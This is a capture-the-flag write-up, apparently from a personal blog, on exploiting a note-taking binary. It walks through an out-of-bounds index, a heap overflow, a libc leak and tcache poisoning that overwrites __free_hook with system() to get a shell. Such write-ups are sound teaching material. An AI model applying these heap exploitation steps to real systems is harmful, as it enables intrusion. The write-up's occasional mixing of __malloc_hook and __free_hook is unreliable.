@@ -1,0 +1,272 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[Writeup] - JHT PWN | vuk3r</title><meta name="author" content="vuk3r"><meta name="copyright" content="vuk3r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Tag : CTF, Challenges, Heap, Tcache Poisoning Link to chall : https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1-hH-UsPbvmHr48W2HkY63XUVURYhMWvd&#x2F;view?usp&#x3D;sharing AnalysisSourcemenu() 123456789int menu()&#123;  puts(&amp;q">
+<meta property="og:type" content="website">
+<meta property="og:title" content="[Writeup] - JHT PWN">
+<meta property="og:url" content="https://vuk3r.github.io/trash/jht.html">
+<meta property="og:site_name" content="vuk3r">
+<meta property="og:description" content="Tag : CTF, Challenges, Heap, Tcache Poisoning Link to chall : https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1-hH-UsPbvmHr48W2HkY63XUVURYhMWvd&#x2F;view?usp&#x3D;sharing AnalysisSourcemenu() 123456789int menu()&#123;  puts(&amp;q">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://vuk3r.github.io/img/avatar/lucy.jpg">
+<meta property="article:published_time" content="2025-06-19T17:14:35.000Z">
+<meta property="article:modified_time" content="2026-01-21T11:43:15.571Z">
+<meta property="article:author" content="vuk3r">
+<meta property="article:tag" content="keyword">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://vuk3r.github.io/img/avatar/lucy.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon/favicon.ico"><link rel="canonical" href="https://vuk3r.github.io/trash/jht.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[Writeup] - JHT PWN',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'page'
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="vuk3r" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/background/cyberpunk.png);"></div><div class="page" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">vuk3r</span></a></span><div id="menus"></div></nav><h1 class="title-seo">[Writeup] - JHT PWN</h1></header><main class="layout" id="content-inner"><div id="page"><div class="page-title">[Writeup] - JHT PWN</div><div class="container" id="article-container"><p>Tag : CTF, Challenges, Heap, Tcache Poisoning</p>
+<p>Link to chall : <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1-hH-UsPbvmHr48W2HkY63XUVURYhMWvd/view?usp=sharing">https://drive.google.com/file/d/1-hH-UsPbvmHr48W2HkY63XUVURYhMWvd/view?usp=sharing</a></p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><code>menu()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Add a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Edit a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Remove a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Read a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>main()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Notebook v1.0 - Beta version&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A place where you can save your note!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_note(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit_note(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        remove_note(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        read_note(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>read_note()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">read_note</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( book[a1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Data: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)book[a1]); <span class="comment">// Out Of Bound</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No note here!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>remove_note()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">remove_note</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( book[a1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)book[a1]);</span><br><span class="line">      book[a1] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No note here!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>edit_note()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit_note</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( book[idx] )                            <span class="comment">// Out Of Bound</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="type">void</span> *)book[idx], (<span class="type">unsigned</span> <span class="type">int</span>)notesize[idx]);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No note here!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>add_note()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">add_note</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD size[<span class="number">3</span>]; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, size);</span><br><span class="line">    <span class="keyword">if</span> ( size[<span class="number">0</span>] &lt;= <span class="number">0x410u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      notesize[idx] = size[<span class="number">0</span>];</span><br><span class="line">      book[idx] = (__int64)<span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">memset</span>((<span class="type">void</span> *)book[idx], <span class="number">0</span>, size[<span class="number">0</span>]);    <span class="comment">// set all to 0</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="type">void</span> *)book[idx], size[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3><p><img src="/img/post/writeup/jht/checksec.png" alt="image.png"></p>
+<h3 id="Build-idea"><a href="#Build-idea" class="headerlink" title="Build idea"></a>Build idea</h3><p>I can’t see the win() function to call flag or shell, so maybe i will do it for my own. We got <code>libc-2.31</code>, different to current version (<code>libc-2.40</code>) so i will try to take addvantage from it so for now my pseudo goal is <em>call shell from system</em>.</p>
+<p>We got some <code>malloc</code>’s call and some <code>Out Of Bound</code> i noted on the source because of it only need </p>
+<p><code>idx</code> no more than <code>4</code> and it is <code>unsigned int</code> so we can go below <code>0</code></p>
+<p>Besides it i will go further for heap exploit.</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>With <code>Out Of Bound (OOB)</code> we can : </p>
+<ul>
+<li>add note - write  address got malloc to somewhere</li>
+<li>read note - read some value from somewhere, for now i think i need some address have libc address</li>
+</ul>
+<p>While debugging, i see two variable <code>notesize[]</code>, <code>book[]</code> is side by side </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x4040c0</span> (notesize) ◂— <span class="number">0xa00000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x4040c8</span> (notesize+<span class="number">8</span>) ◂— <span class="number">0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x4040e8</span> (book+<span class="number">8</span>) —▸ <span class="number">0x4052a0</span> ◂— <span class="string">&#x27;aaaaaaaa\n&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x4040f0</span> (book+<span class="number">16</span>) ◂— <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x4040f8</span> (book+<span class="number">24</span>) ◂— <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>and with <code>OOB</code> we can bypass this:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">in <span class="title function_">edit_note</span><span class="params">()</span>:</span><br><span class="line"><span class="title function_">read</span><span class="params">(<span class="number">0</span>, (<span class="type">void</span> *)book[idx], (<span class="type">unsigned</span> <span class="type">int</span>)notesize[idx])</span>;</span><br><span class="line"></span><br><span class="line">in <span class="title function_">add_note</span><span class="params">()</span>:</span><br><span class="line"><span class="title function_">if</span> <span class="params">( size[<span class="number">0</span>] &lt;= <span class="number">0x410u</span> )</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>let me explain, when adding note, size it can’t be more than <code>0x410u</code> but because of <code>notesize</code> is array next to <code>book</code> so if we make a <code>book</code> with index &lt; 0 we can overwrite <code>notesize</code> with some value</p>
+<p>So i will make a book[0] with size is 10 and a book[-4], then debug i think i can see something.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x4040c0</span> (notesize) —▸ <span class="number">0x4052c0</span> ◂— <span class="number">0xa342d342d342d</span> <span class="comment">/* &#x27;-4-4-4\n&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x4040c8</span> (notesize+<span class="number">8</span>) ◂— <span class="number">0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x4040e0</span> (book) —▸ <span class="number">0x4052a0</span> ◂— <span class="string">&#x27;abcdefg\n&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x4040e8</span> (book+<span class="number">8</span>) ◂— <span class="number">0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br></pre></td></tr></table></figure>
+
+<p>with size of book[0] has size with notesize[0], but create another book[-4] will overwrite it to some malloc address and now, value of notesize[0] become to <code>0x4040c0</code> </p>
+<p>so it means we can have input more than before.</p>
+<p><img src="/img/post/writeup/jht/1.png" alt="image.png"></p>
+<p>⇒ We got <code>Heap Overflow</code> </p>
+<p>If we got <code>heap Overflow</code> so maybe we could use <code>tcache poisoning</code> technique. Unil now, my raw map I think is :</p>
+<p><code>Heap Overflow</code> → <code>tcache poisoning</code> then we can call system, maybe.</p>
+<p>To confirm that can use <code>tcache poisoning</code>, we must do some research because <code>tcache poisoning</code> is almost dependent on libc version, I need to check if this libc version (<code>libc-2.31</code>) have some vulnerabilities and i found <code>__malloc_hook</code> called when using <code>free()</code>.  </p>
+<h3 id="Research"><a href="#Research" class="headerlink" title="Research"></a>Research</h3><p>Note : If you already know about <code>__malloc_hook</code> you can continue to exploit phase.</p>
+<p>Do some research and i find this, it’s help me alots <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/34804">https://ctftime.org/writeup/34804</a></p>
+<p>Let me explain, <code>Glibc &lt; 2.34</code> will have a memory for pre-free is <code>__malloc_hook</code> </p>
+<p>with libc version i mentioned, when you call <code>free()</code> function, it will check <code>__malloc_hook</code> if exist data or not. I will show my deep road while dive in into <code>free()</code> in these pictures : </p>
+<p>when you call <code>free()</code>, it will check if  <code>__malloc_hook</code> has some data, if not, do <code>free()</code> like normal action. It check by take the value  at <code>__free_hook</code> and assign it again for <code>rax</code> then call<br><code>test rax,rax</code> (AND bit) and <code>jne</code> (jump if not equal) and jump if <code>test</code> answer’s is <em>not zero</em>.  </p>
+<p><img src="/img/post/writeup/jht/2.png" alt="image.png"></p>
+<p>Here is <code>__free_hook</code> memory:</p>
+<p><img src="/img/post/writeup/jht/3.png" alt="image.png"></p>
+<p>⇒ So what if i got something for this memory ?</p>
+<p>i overwrite value is <code>system</code> address in this function, and debug again so what we can see in it !</p>
+<p><img src="/img/post/writeup/jht/4.png" alt="image.png"></p>
+<p>So <code>test rax,rax</code> do some FLAG stuff and will jump to <code>free+152</code></p>
+<p><img src="/img/post/writeup/jht/5.png" alt="image.png"></p>
+<p>And you can see in the pictures, it will lead to <code>jmp rax</code> at <code>free+161</code><br>and <code>rax</code> is a value of <code>__free_hook</code> - the address i setup - <code>address system</code> </p>
+<p>In summary, it means :</p>
+<p><strong>with <code>Glibc &lt; 2.34</code>, will exist a memory name <code>__free_hook</code> and when you call <code>free()</code>, it will check for this memory if it exist some value, it will jump into that value, but if not, free as normal. Take advantage from it, we could prepare poison  for tcache in these  versions.</strong></p>
+<h3 id="Attack-road"><a href="#Attack-road" class="headerlink" title="Attack road"></a>Attack road</h3><p>We need <code>system()</code> address in libc written into <code>__malloc_hook</code>, we need <code>rdi</code> is an address has value <code>“/bin/sh”</code></p>
+<p>Luckily, the way we exploit <code>__malloc_hook</code> won’t change anything while call <code>free(arg)</code>, <code>rdi</code> always be <code>arg</code>. You can look back to final pictures, i freed a memory with data is <code>“/bin/sh”</code> and rdi still got that. It means we only set up for <code>system()</code>.</p>
+<p>I always find root by follow its branch, so I will find way by reverse the way : </p>
+<p><code>__malloc_hook</code> has <code>system()</code> address → <code>Tcache poisoning</code> → <code>Heap overflow</code> can overwrite linked address → <code>Out Of Bound</code>  for overwrite size of book + <code>leak libc</code> address</p>
+<p>I use <code>read_note()</code> to read a value from an address, And with my experiment, <code>GOT</code> always has libc address, so if i can find some address calling to GOT address, it can leak libc address.</p>
+<p>You can see that I search for <code>scanf</code> address for somewhere and find in <code>0x400798</code>. </p>
+<p><img src="/img/post/writeup/jht/6.png" alt="image.png"></p>
+<p>calculate from <code>book[]</code>, the index is <code>-1833</code>, build payload and decode, I got libc address.</p>
+<p>→ We could find <code>System()</code> address.</p>
+<p>For <code>tcache poisoning</code>, we will using <code>heap overflow</code> and to use it, we need to overwrite size of book i mentioned before, so here is how I do it :</p>
+<ul>
+<li>Create 3 books with index 0, 2, 3. Im not using index 1 because if you overwrite notesize - 4 byte with 8 byte, index 1 will affected, so to avoid it, use 2 and 3 or more.</li>
+</ul>
+<p><img src="/img/post/writeup/jht/7.png" alt="image.png"></p>
+<ul>
+<li>Free index 3 then to 2 for tcache linked</li>
+</ul>
+<p><img src="/img/post/writeup/jht/8.png" alt="image.png"></p>
+<ul>
+<li>Create a <code>book[-4]</code> and overwrite size of <code>book[0]</code> ⇒ Bypass size of note.</li>
+</ul>
+<p><img src="/img/post/writeup/jht/9.png" alt="image.png"></p>
+<ul>
+<li>Padding until Overwrite the linked address</li>
+</ul>
+<p><img src="/img/post/writeup/jht/10.png" alt="image.png"></p>
+<p><img src="/img/post/writeup/jht/11.png" alt="image.png"></p>
+<ul>
+<li>Malloc with that size again and we got a variable with data pointed into __free_hook and add <code>system()</code> address.</li>
+</ul>
+<p><img src="/img/post/writeup/jht/12.png" alt="image.png"></p>
+<p>Every thing has been setup,call <code>remove_note()</code> and debug at <code>free()</code> to see what happen : </p>
+<p><img src="/img/post/writeup/jht/13.png" alt="image.png"></p>
+<p>It will jump to <code>rax</code>, the <code>system()</code> address with <code>rdi</code> is a memory with <code>“/bin/sh&quot;</code></p>
+<p><em>PWN ! Did your brain got poisoned ?</em> </p>
